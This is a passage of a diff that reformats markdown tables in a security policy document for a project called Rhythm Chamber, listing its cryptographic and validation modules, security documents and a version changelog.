 - Description of the vulnerability
 - Steps to reproduce
 - Potential impact
@@ -1117,6 +1204,7 @@ If you discover a security vulnerability in Rhythm Chamber:
 ### 14.3 Safe Harbor
 
 **We commit to:**
+
 - Respond to security reports within 7 days
 - Provide regular updates on remediation progress
 - Credit researchers who follow responsible disclosure
@@ -1128,46 +1216,46 @@ If you discover a security vulnerability in Rhythm Chamber:
 
 ### Cryptographic Modules
 
-| Module | Lines | Purpose | Algorithm |
-|--------|-------|---------|-----------|
-| **key-manager.js** | 651 | Key lifecycle management | PBKDF2-210k |
-| **crypto.js** | 495 | Storage encryption | AES-GCM-256 |
-| **message-security.js** | 698 | Message authentication | HMAC-SHA256 |
-| **hybrid-encryption.js** | 428 | E2E messaging | RSA-OAEP-2048 + AES-GCM-256 |
-| **token-binding.js** | 353 | Device fingerprint | SHA-256 |
-| **secure-token-store.js** | 743 | Token management | SHA-256 + HMAC |
-| **license-verifier.js** | 542 | License verification | HMAC-SHA256 |
+| Module                    | Lines | Purpose                  | Algorithm                   |
+| ------------------------- | ----- | ------------------------ | --------------------------- |
+| **key-manager.js**        | 651   | Key lifecycle management | PBKDF2-210k                 |
+| **crypto.js**             | 495   | Storage encryption       | AES-GCM-256                 |
+| **message-security.js**   | 698   | Message authentication   | HMAC-SHA256                 |
+| **hybrid-encryption.js**  | 428   | E2E messaging            | RSA-OAEP-2048 + AES-GCM-256 |
+| **token-binding.js**      | 353   | Device fingerprint       | SHA-256                     |
+| **secure-token-store.js** | 743   | Token management         | SHA-256 + HMAC              |
+| **license-verifier.js**   | 542   | License verification     | HMAC-SHA256                 |
 
 ### Validation Modules
 
-| Module | Lines | Purpose |
-|--------|-------|---------|
-| **html-escape.js** | ~50 | XSS prevention |
-| **validation.js** (facade) | ~ | Input validation |
-| **validation/regex-validator.js** | ~ | ReDoS prevention |
+| Module                            | Lines | Purpose          |
+| --------------------------------- | ----- | ---------------- |
+| **html-escape.js**                | ~50   | XSS prevention   |
+| **validation.js** (facade)        | ~     | Input validation |
+| **validation/regex-validator.js** | ~     | ReDoS prevention |
 
 ### Security Documentation
 
-| Document | Purpose |
-|----------|---------|
-| **docs/security-milestone-v0.9.md** | v0.9 milestone summary |
-| **docs/security/ReDoS-Bypass-Vulnerability-Fix.md** | ReDoS fix details |
-| **docs/security/audits/2026-01-28-dom-xss-analysis.md** | DOM XSS analysis |
-| **docs/ENCRYPTION-MIGRATION.md** | v1.0 breaking change guide |
+| Document                                                | Purpose                    |
+| ------------------------------------------------------- | -------------------------- |
+| **docs/security-milestone-v0.9.md**                     | v0.9 milestone summary     |
+| **docs/security/ReDoS-Bypass-Vulnerability-Fix.md**     | ReDoS fix details          |
+| **docs/security/audits/2026-01-28-dom-xss-analysis.md** | DOM XSS analysis           |
+| **docs/ENCRYPTION-MIGRATION.md**                        | v1.0 breaking change guide |
 
 ---
 
 ## Appendix B: Security Changelog
 
-| Version | Date | Changes |
-|---------|------|---------|
-| 2.0 | 2025-01-29 | Consolidated security documentation with Domain 4 insights |
-| 1.5 | 2026-01-24 | Added v0.9 storage security improvements (TOCTOU prevention, token binding, CORS validation) |
-| 1.4 | 2026-01-18 | Updated to reflect WASM-only semantic search (removed cloud vector database dependency) |
-| 1.3 | 2026-01-15 | Updated to reflect three-layer value stack (Emotional, Privacy, Control) |
-| 1.2 | 2026-01-13 | Clarified obfuscation vs encryption |
-| 1.1 | 2026-01-12 | XSS token protection, adaptive lockouts, unified errors |
-| 1.0 | 2026-01-12 | Initial security model |
+| Version | Date       | Changes                                                                                      |
+| ------- | ---------- | -------------------------------------------------------------------------------------------- |
+| 2.0     | 2025-01-29 | Consolidated security documentation with Domain 4 insights                                   |
+| 1.5     | 2026-01-24 | Added v0.9 storage security improvements (TOCTOU prevention, token binding, CORS validation) |
+| 1.4     | 2026-01-18 | Updated to reflect WASM-only semantic search (removed cloud vector database dependency)      |
+| 1.3     | 2026-01-15 | Updated to reflect three-layer value stack (Emotional, Privacy, Control)                     |
+| 1.2     | 2026-01-13 | Clarified obfuscation vs encryption                                                          |
+| 1.1     | 2026-01-12 | XSS token protection, adaptive lockouts, unified errors                                      |
+| 1.0     | 2026-01-12 | Initial security model                                                                       |
 
 ---
 
